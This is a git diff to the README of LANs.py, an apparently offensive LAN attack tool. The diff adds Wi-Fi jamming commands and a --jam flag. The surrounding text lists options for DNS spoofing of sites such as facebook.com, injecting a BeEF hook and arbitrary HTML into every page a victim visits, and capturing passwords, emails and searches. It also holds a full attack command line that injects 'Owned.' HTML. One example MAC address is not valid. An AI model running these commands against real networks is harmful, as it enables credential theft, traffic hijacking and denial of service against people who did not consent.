@@ -90,11 +90,18 @@ Example 2: This will spoof the domain eff.org and subdomains of eff.org. When th
 python LANs.py -v -d -p -n -na -set -a -r 80.87.128.67 -c '<title>Owned.</title>' -b http://192.168.0.5:3000/hook.js -ip 192.168.0.10
 ```
 
+
 #### Jam all WiFi networks:
 
 ``` shell
-python LANs.py
+python LANs.py --jam
 ```
+
+
+#### Jam just one access point (router)
+``` shell
+python Lans.py --jam --accesspoint 01:MA:C0:AD:DY
+
 
 ### All options:
 -----
@@ -102,36 +109,22 @@ python LANs.py
 Normal Usage:
 
   * -b BEEF_HOOK_URL: copy the BeEF hook URL to inject it into every page the victim visits, eg: -b http://192.168.1.10:3000/hook.js
-  
   * -c 'HTML CODE': inject arbitrary HTML code into pages the victim visits; include the quotes when selecting HTML to inject
-  
   * -d: open an xterm with driftnet to see all images they view
-  
   * -dns DOMAIN: spoof the DNS of DOMAIN. e.g. -dns facebook.com will DNS spoof every DNS request to facebook.com or subdomain.facebook.com
-  
   * -a: Spoof every DNS response the victim makes, effectively creating a captive portal page; -r option can be used with this
-  
   * -r IPADDRESS: only to be used with the -dns DOMAIN option; redirect the user to this IPADDRESS when they visit DOMAIN
-  
   * -u: prints URLs visited; truncates at 150 characters and filters image/css/js/woff/svg urls since they spam the output and are uninteresting
-  
   * -i INTERFACE: specify interface; default is first interface in `ip route`, eg: -i wlan0
-  
   * -ip: target this IP address
-  
   * -n: performs a quick nmap scan of the target
-  
   * -na: performs an aggressive nmap scan in the background and outputs to [victim IP address].nmap.txt
-  
   * -p: print username/passwords for FTP/IMAP/POP/IRC/HTTP, HTTP POSTs made, all searches made, incoming/outgoing emails, and IRC messages sent/received
-  
   * -pcap PCAP_FILE: parse through all the packets in a pcap file; requires the -ip [target's IP address] argument
-  
   * -rmac ROUTER_MAC: enter router MAC here if you're having trouble getting the script to automatically fetch it
-  
   * -rip ROUTER_IP: enter router IP here if you're having trouble getting the script to automatically fetch it
-  
   * -v: show verbose URLs which do not truncate at 150 characters like -u
+  * --jam: jam all or some 2.4GHz wireless access points and clients in range; use arguments below in conjunction with this argument if necessary
 
 Wifi Jamming:
 
